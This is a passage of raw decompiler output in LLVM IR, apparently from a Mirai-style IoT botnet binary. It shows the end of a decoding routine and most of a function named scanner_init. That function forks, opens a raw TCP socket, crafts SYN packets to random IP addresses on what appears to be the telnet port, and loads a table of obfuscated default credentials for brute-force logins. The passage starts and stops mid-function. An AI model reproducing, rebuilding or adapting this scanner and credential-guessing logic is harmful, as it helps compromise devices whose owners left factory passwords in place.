  %v6_e310 = zext i8 %v4_e310 to i32
  %v1_e314 = xor i32 %v6_e310, 84
  store i32 %v1_e314, i32* %r3.global-to-local, align 4
  %v1_e318 = trunc i32 %v1_e314 to i8
  store i8 %v1_e318, i8* %v3_e310, align 1
  %v0_e31c = load i32, i32* %r2.global-to-local, align 4
  %v1_e31c = add i32 %v0_e31c, 1
  store i32 %v1_e31c, i32* %r2.global-to-local, align 4
  %v1_e320 = load i32, i32* @r6, align 4
  %v9_e320 = icmp eq i32 %v1_e31c, %v1_e320
  br i1 %v9_e320, label %dec_label_pc_e328.loopexit, label %dec_label_pc_e310

dec_label_pc_e328.loopexit:                       ; preds = %dec_label_pc_e310
  %extract.t7 = trunc i32 %v1_e31c to i8
  br label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e328.loopexit, %dec_label_pc_e2bc
  %v0_e338.off0 = phi i8 [ %extract.t7, %dec_label_pc_e328.loopexit ], [ %extract.t8, %dec_label_pc_e2bc ]
  %v2_e328 = load i32, i32* @global_var_218d8.139, align 4
  store i32 %v2_e328, i32* %r0.global-to-local, align 4
  %v2_e32c = load i32, i32* @global_var_21904.141, align 4
  %v3_e330 = mul i32 %v2_e328, 16
  store i32 %v3_e330, i32* %r1.global-to-local, align 4
  %v2_e334 = or i32 %v3_e330, 13
  %v3_e338 = add i32 %v2_e334, %v2_e32c
  %v4_e338 = inttoptr i32 %v3_e338 to i8*
  store i8 %v0_e338.off0, i8* %v4_e338, align 1
  store i32 ptrtoint (i16** @global_var_21908.143 to i32), i32* %r4.global-to-local, align 4
  %v2_e344 = load i16, i16* bitcast (i16** @global_var_21908.143 to i16*), align 4
  %v3_e344 = zext i16 %v2_e344 to i32
  store i32 %v3_e344, i32* %lr.global-to-local, align 4
  %v2_e34c = load i32, i32* @global_var_21904.141, align 4
  store i32 %v2_e34c, i32* %r2.global-to-local, align 4
  %v0_e354 = load i32, i32* %r1.global-to-local, align 4
  %v2_e354 = add i32 %v0_e354, %v2_e34c
  store i32 %v2_e354, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21908.143 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e35c = load i32, i32* @sb, align 4
  %v1_e35c = load i32, i32* @r7, align 4
  %v2_e35c = add i32 %v1_e35c, %v0_e35c
  store i32 %v2_e35c, i32* %ip.global-to-local, align 4
  %v0_e360 = load i32, i32* %r0.global-to-local, align 4
  %v1_e360 = add i32 %v0_e360, 1
  store i32 %v1_e360, i32* %r0.global-to-local, align 4
  %v3_e364 = add i32 %v2_e354, 10
  %v4_e364 = inttoptr i32 %v3_e364 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21908.143 to i32), i32 16), i32 16) to i16), i16* %v4_e364, align 2
  %v0_e368 = load i32, i32* %lr.global-to-local, align 4
  %v1_e368 = trunc i32 %v0_e368 to i16
  %v2_e368 = load i32, i32* %r1.global-to-local, align 4
  %v3_e368 = add i32 %v2_e368, 8
  %v4_e368 = inttoptr i32 %v3_e368 to i16*
  store i16 %v1_e368, i16* %v4_e368, align 2
  %v0_e36c = load i32, i32* %r5.global-to-local, align 4
  %v1_e36c = load i32, i32* %ip.global-to-local, align 4
  %v2_e36c = add i32 %v1_e36c, 4
  %v3_e36c = inttoptr i32 %v2_e36c to i32*
  store i32 %v0_e36c, i32* %v3_e36c, align 4
  %v1_e370 = load i32, i32* @fp, align 4
  %v2_e370 = inttoptr i32 %v1_e370 to i32*
  store i32 %v1_e360, i32* %v2_e370, align 4
  %v0_e374 = load i32, i32* %r3.global-to-local, align 4
  %v1_e374 = trunc i32 %v0_e374 to i16
  %v2_e374 = load i32, i32* %r4.global-to-local, align 4
  %v3_e374 = inttoptr i32 %v2_e374 to i16*
  store i16 %v1_e374, i16* %v3_e374, align 2
  store i32 %v3_e230, i32* @r4, align 4
  store i32 %v6_e230, i32* @r5, align 4
  store i32 %v9_e230, i32* @r6, align 4
  store i32 %v12_e230, i32* @r7, align 4
  store i32 %v15_e230, i32* @r8, align 4
  store i32 %v18_e230, i32* @sb, align 4
  store i32 %v21_e230, i32* @sl, align 4
  store i32 %v24_e230, i32* @fp, align 4
  ret i32 %v1_e360

; uselistorder directives
  uselistorder i32 %v3_e330, { 1, 0 }
  uselistorder i32 %v1_e31c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e2f0, { 1, 0, 2 }
  uselistorder i32 %v3_e2c4, { 1, 0 }
  uselistorder i32 %v1_e2b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e284, { 1, 0, 2 }
  uselistorder i32 %v2_e260, { 1, 0, 2 }
  uselistorder i32 %v3_e254, { 1, 0 }
  uselistorder i32 %v1_e244, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 23, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e390 = load i32, i32* @r5, align 4
  %v18_e390 = load i32, i32* @sb, align 4
  %v0_e39c = call i32 @__libc_fork()
  store i32 %v0_e39c, i32* %r0.global-to-local, align 4
  %v7_e3a0 = icmp eq i32 %v0_e39c, -1
  %. = zext i1 %v7_e3a0 to i32
  %tmp369 = icmp slt i32 %v0_e39c, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_243f8.145 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e3bc = icmp eq i32 %storemerge329, 0
  store i1 %v2_e3bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e39c, i32* @global_var_243f8.145, align 4
  br i1 %v2_e3bc, label %dec_label_pc_e3d8, label %dec_label_pc_e3c8

dec_label_pc_e3c8:                                ; preds = %entry
  store i32 %v6_e390, i32* @r5, align 4
  store i32 %v18_e390, i32* @sb, align 4
  ret i32 %v0_e39c

dec_label_pc_e3d8:                                ; preds = %entry
  %v0_e3d8 = call i32 @util_local_addr()
  store i32 %v0_e3d8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e3d8, i32* @global_var_243d4.57, align 4
  %v1_e3e4 = call i32 @rand_init(i32 %v0_e3d8)
  %v0_e3e8 = load i32, i32* @r4, align 4
  store i32 %v0_e3e8, i32* %r0.global-to-local, align 4
  %v1_e3ec = inttoptr i32 %v0_e3e8 to i32*
  %v2_e3ec = call i32 @__GI_time(i32* %v1_e3ec)
  store i32 ptrtoint (i32* @global_var_2190c.137 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e3ec, i32* @global_var_2190c.137, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e400 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_243f0.149 to i32), i32* %r3.global-to-local, align 4
  %v0_e408 = load i32, i32* @r4, align 4
  store i32 %v0_e408, i32* %stack_var_-52, align 4
  store i32 %v2_e400, i32* @global_var_243f0.149, align 4
  store i32 %v0_e408, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e414

dec_label_pc_e414:                                ; preds = %dec_label_pc_e414.dec_label_pc_e414_crit_edge, %dec_label_pc_e3d8
  %v2_e420 = phi i32 [ %v2_e420.pre, %dec_label_pc_e414.dec_label_pc_e414_crit_edge ], [ %v2_e400, %dec_label_pc_e3d8 ]
  %v0_e428 = phi i32 [ %v0_e458, %dec_label_pc_e414.dec_label_pc_e414_crit_edge ], [ %v0_e408, %dec_label_pc_e3d8 ]
  %v3_e41c = mul i32 %v0_e428, 256
  store i32 %v3_e41c, i32* %ip.global-to-local, align 4
  store i32 %v2_e420, i32* @lr, align 4
  %v2_e430 = mul i32 %v0_e428, 288
  %v1_e438 = add i32 %v0_e428, 1
  store i32 %v1_e438, i32* %r0.global-to-local, align 4
  %v2_e43c = add i32 %v2_e430, %v2_e420
  store i32 %v2_e43c, i32* %r2.global-to-local, align 4
  store i32 %v2_e43c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e450 = add i32 %v2_e43c, 4
  %v3_e450 = inttoptr i32 %v2_e450 to i32*
  store i32 -1, i32* %v3_e450, align 4
  %v0_e454 = load i32, i32* @r5, align 4
  %v1_e454 = load i32, i32* %r1.global-to-local, align 4
  %v2_e454 = add i32 %v1_e454, 12
  %v3_e454 = inttoptr i32 %v2_e454 to i32*
  store i32 %v0_e454, i32* %v3_e454, align 4
  %v0_e458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e458, i32* %stack_var_-52, align 4
  %v7_e45c = icmp sgt i32 %v1_e438, 255
  br i1 %v7_e45c, label %dec_label_pc_e460, label %dec_label_pc_e414.dec_label_pc_e414_crit_edge

dec_label_pc_e414.dec_label_pc_e414_crit_edge:    ; preds = %dec_label_pc_e414
  %v2_e420.pre = load i32, i32* @global_var_243f0.149, align 4
  br label %dec_label_pc_e414

dec_label_pc_e460:                                ; preds = %dec_label_pc_e414
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e46c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e46c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243f4.151 to i32), i32* %r2.global-to-local, align 4
  %v2_e474 = icmp eq i32 %v3_e46c, -1
  store i1 %v2_e474, i1* %cpsr_c.global-to-local, align 1
  %v7_e474 = icmp eq i32 %v3_e46c, -1
  store i1 %v7_e474, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e46c, i32* @r4, align 4
  store i32 %v3_e46c, i32* @global_var_243f4.151, align 4
  br i1 %v7_e474, label %dec_label_pc_e460.dec_label_pc_fa34_crit_edge, label %dec_label_pc_e484

dec_label_pc_e460.dec_label_pc_fa34_crit_edge:    ; preds = %dec_label_pc_e460
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_fa34

dec_label_pc_e484:                                ; preds = %dec_label_pc_e460
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e488 = load i32, i32* @r5, align 4
  store i32 %v0_e488, i32* @r2, align 4
  %v2_e48c = call i32 @__libc_fcntl(i32 %v3_e46c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e494 = or i32 %v2_e48c, 2048
  store i32 %v1_e494, i32* @r2, align 4
  %v0_e498 = load i32, i32* @r4, align 4
  store i32 %v0_e498, i32* %r0.global-to-local, align 4
  %v2_e49c = call i32 @__libc_fcntl(i32 %v0_e498, i32 4)
  %v2_e4a4 = load i32, i32* @global_var_243f4.151, align 4
  store i32 %v2_e4a4, i32* %r0.global-to-local, align 4
  %v2_e4a8 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e4b0 = load i32, i32* @r5, align 4
  store i32 %v0_e4b0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e4b8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e4b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e4c8 = call i32 @__GI_setsockopt(i32 %v2_e4a4, i32 %v0_e4b0, i32 3, i32 %v2_e4b8, i32 4)
  store i32 %v5_e4c8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e4cc = icmp eq i32 %v5_e4c8, 0
  store i1 %v2_e4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e4cc, label %dec_label_pc_e4d4, label %dec_label_pc_fa28

dec_label_pc_e4d4:                                ; preds = %dec_label_pc_e484, %dec_label_pc_e4d4
  %v0_e4d4 = call i32 @rand_next()
  %v3_e4d8 = mul i32 %v0_e4d4, 65536
  store i32 %v3_e4d8, i32* %r0.global-to-local, align 4
  %v1_e4e0 = mul i32 %v0_e4d4, 256
  %v3_e4e4 = and i32 %v1_e4e0, 65280
  %tmp372 = udiv i32 %v0_e4d4, 256
  %v4_e4e8 = urem i32 %tmp372, 256
  %v5_e4e8 = or i32 %v4_e4e8, %v3_e4e4
  store i32 %v5_e4e8, i32* %r3.global-to-local, align 4
  %v2_e4ec = icmp ugt i32 %v5_e4e8, 1023
  store i1 %v2_e4ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e4ec = icmp eq i32 %v5_e4e8, 1024
  store i1 %v7_e4ec, i1* %cpsr_z.global-to-local, align 1
  %v3_e4f4 = icmp ult i32 %v5_e4e8, 1022
  br i1 %v3_e4f4, label %dec_label_pc_e4d4, label %dec_label_pc_e4f8

dec_label_pc_e4f8:                                ; preds = %dec_label_pc_e4d4
  %v5_e4f0.le = trunc i32 %v0_e4d4 to i16
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %r0.global-to-local, align 4
  %v2_e4fc = load i8, i8* bitcast (i8** @global_var_218dc.153 to i8*), align 4
  %v3_e4fc = zext i8 %v2_e4fc to i32
  %v1_e500 = and i32 %v3_e4fc, 240
  %v1_e504 = or i32 %v1_e500, 5
  store i32 %v1_e504, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_218dc.153 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_218de.154 to i16*), align 4
  %v0_e524 = call i32 @rand_next()
  %v1_e524 = trunc i32 %v0_e524 to i16
  %v3_e52c = load i8, i8* @global_var_218fc.157, align 1
  store i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %ip.global-to-local, align 4
  %v1_e53c = urem i8 %v3_e52c, 16
  store i16 %v1_e524, i16* bitcast (i32* @global_var_218e0.158 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e54c = or i8 %v1_e53c, 80
  store i8 64, i8* bitcast (i32* @global_var_218e4.159 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_218e5.160 to i8*), align 4
  store i8 %v1_e54c, i8* @global_var_218fc.157, align 1
  %v4_e55c = sext i16 %v5_e4f0.le to i32
  store i32 %v4_e55c, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_218f2.161, align 2
  store i16 %v5_e4f0.le, i16* @global_var_218f0.156, align 2
  %v0_e56c = call i32 @rand_next()
  %v1_e56c = trunc i32 %v0_e56c to i16
  %v3_e574 = load i8, i8* @global_var_218fd.162, align 1
  %v4_e574 = zext i8 %v3_e574 to i32
  store i32 ptrtoint (i16* @global_var_218f0.156 to i32), i32* %ip.global-to-local, align 4
  %v1_e57c = or i32 %v4_e574, 2
  store i32 %v1_e57c, i32* %r3.global-to-local, align 4
  store i16 %v1_e56c, i16* bitcast (i32* @global_var_218fe.163 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_18f6c.165 to i32), i32* %r1.global-to-local, align 4
  %v1_e588 = trunc i32 %v1_e57c to i8
  store i8 %v1_e588, i8* @global_var_218fd.162, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e594 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint (i32* @global_var_18f6c.165 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18f70.169 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e5a4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint ([5 x i8]* @global_var_18f70.169 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18f78.171 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e5b4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint ([9 x i8]* @global_var_18f78.171 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_18f84.173 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18f84.173 to i32), i32* %r1.global-to-local, align 4
  %v5_e5c4 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18f84.173 to i32), i32 ptrtoint ([7 x i8]* @global_var_18f84.173 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18f6c.165 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e5d4 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32 ptrtoint (i32* @global_var_18f6c.165 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18f94.177 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e5e4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint ([9 x i8]* @global_var_18f94.177 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_18fa0.179 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18fa0.179 to i32), i32* %r1.global-to-local, align 4
  %v5_e5f4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18fa0.179 to i32), i32 ptrtoint ([6 x i8]* @global_var_18fa0.179 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18fa8.181 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e604 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint ([6 x i8]* @global_var_18fa8.181 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_18fb0.183 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18fb0.183 to i32), i32* %r1.global-to-local, align 4
  %v5_e614 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18fb0.183 to i32), i32 ptrtoint ([8 x i8]* @global_var_18fb0.183 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e624 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18fb8.185 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e634 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint (i32* @global_var_18fb8.185 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18fc8.187 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e644 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18f68.167 to i32), i32 ptrtoint ([6 x i8]* @global_var_18fc8.187 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), i32* %r1.global-to-local, align 4
  %v5_e654 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18fc8.187 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e664 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18fd0.189 to i32), i32 ptrtoint ([6 x i8]* @global_var_18fc8.187 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18fd8.191 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e674 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32 ptrtoint (i32* @global_var_18fd8.191 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18fe4.193 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e684 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18f8c.175 to i32), i32 ptrtoint (i32* @global_var_18fe4.193 to i32), i32 15)
  store i32 %v4_e684, i32* %r0.global-to-local, align 4
  %v2_e68c = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e68c, i32* @lr, align 4
  %v1_e9b8 = add i32 %v2_e68c, 20
  %v1_ea0c = add i32 %v2_e68c, 16
  %v2_ea0c = inttoptr i32 %v1_ea0c to i32*
  %v1_ea20 = add i32 %v2_e68c, 9
  %v2_ea20 = inttoptr i32 %v1_ea20 to i8*
  %v1_eab4 = add i32 %v2_e68c, 12
  %v2_eab4 = inttoptr i32 %v1_eab4 to i32*
  %v2_ec98 = ptrtoint i32* %stack_var_-40 to i32
  %v2_ece0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_ece4 = ptrtoint i32* %stack_var_-224 to i32
  %v2_ece8 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f6bc = ptrtoint i32* %stack_var_-45 to i32
  %v2_f6d0 = ptrtoint i32* %stack_var_-77 to i32
  %v2_f628 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f7e4 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e6b4 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %dec_label_pc_ee7c, %dec_label_pc_e4f8
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e4f8 ], [ %stack_var_-1876.1, %dec_label_pc_ee7c ]
  store i32 ptrtoint (i32* @global_var_2190c.137 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e69c = load i32, i32* @global_var_2190c.137, align 4
  store i32 %v2_e69c, i32* @r4, align 4
  %v3_e6a0 = icmp uge i32 %stack_var_-1876.0, %v2_e69c
  store i1 %v3_e6a0, i1* %cpsr_c.global-to-local, align 1
  %v9_e6a0 = icmp eq i32 %stack_var_-1876.0, %v2_e69c
  store i1 %v9_e6a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e6a0, label %dec_label_pc_e9a8, label %dec_label_pc_e6a8

dec_label_pc_e6a8:                                ; preds = %dec_label_pc_e694
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_e6b4, i32* @r5, align 4
  br label %dec_label_pc_e6b8

dec_label_pc_e6b8:                                ; preds = %bb407, %dec_label_pc_e6a8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e6cc = call i32 @rand_next()
  %v1_e6cc = trunc i32 %v0_e6cc to i16
  store i32 %v0_e6cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_218dc.153 to i32), i32* %ip.global-to-local, align 4
  %v2_e6d8 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_e6d8, i32* %r3.global-to-local, align 4
  store i16 %v1_e6cc, i16* bitcast (i32* @global_var_218e0.158 to i16*), align 4
  store i32 %v2_e6d8, i32* @global_var_218e8.194, align 4
  br label %dec_label_pc_e6e4

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e83c, %dec_label_pc_e714, %dec_label_pc_e870, %dec_label_pc_e864, %dec_label_pc_e858, %dec_label_pc_e84c, %.thread48, %.thread32, %.thread28, %.thread24, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e7b0, %dec_label_pc_e7a8, %bb383, %dec_label_pc_e778, %dec_label_pc_e754, %bb376, %dec_label_pc_e724, %bb375, %dec_label_pc_e70c, %bb374, %bb400, %dec_label_pc_e6b8
  %v0_e6e4 = call i32 @rand_next()
  store i32 %v0_e6e4, i32* %r0.global-to-local, align 4
  %v1_e6e8 = urem i32 %v0_e6e4, 256
  store i32 %v1_e6e8, i32* %r1.global-to-local, align 4
  %v3_e6ec = udiv i32 %v0_e6e4, 256
  store i32 %v3_e6ec, i32* %r3.global-to-local, align 4
  %v3_e6f0 = udiv i32 %v0_e6e4, 65536
  store i32 %v3_e6f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e6f4 = icmp eq i32 %v1_e6e8, 0
  store i1 %v2_e6f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e6f4, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e6e4
  %v3_e6f8 = icmp ugt i32 %v1_e6e8, 126
  store i1 %v3_e6f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e6f8 = icmp eq i32 %v1_e6e8, 127
  store i1 %v8_e6f8, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e6e4, %bb373
  %v0_e708 = phi i1 [ true, %dec_label_pc_e6e4 ], [ %v8_e6f8, %bb373 ]
  %v1_e6fc = urem i32 %v3_e6ec, 256
  store i32 %v1_e6fc, i32* %ip.global-to-local, align 4
  %v1_e700 = urem i32 %v3_e6f0, 256
  store i32 %v1_e700, i32* %r2.global-to-local, align 4
  %v1_e704 = and i32 %v0_e6e4, 8388608
  %v2_e704 = icmp ne i32 %v1_e704, 0
  store i1 %v2_e704, i1* %cpsr_c.global-to-local, align 1
  %v3_e704 = udiv i32 %v0_e6e4, 16777216
  store i32 %v3_e704, i32* %r0.global-to-local, align 4
  br i1 %v0_e708, label %dec_label_pc_e6e4, label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %bb374
  %v2_e70c = icmp ugt i32 %v1_e6e8, 2
  store i1 %v2_e70c, i1* %cpsr_c.global-to-local, align 1
  %v7_e70c = icmp eq i32 %v1_e6e8, 3
  store i1 %v7_e70c, i1* %cpsr_z.global-to-local, align 1
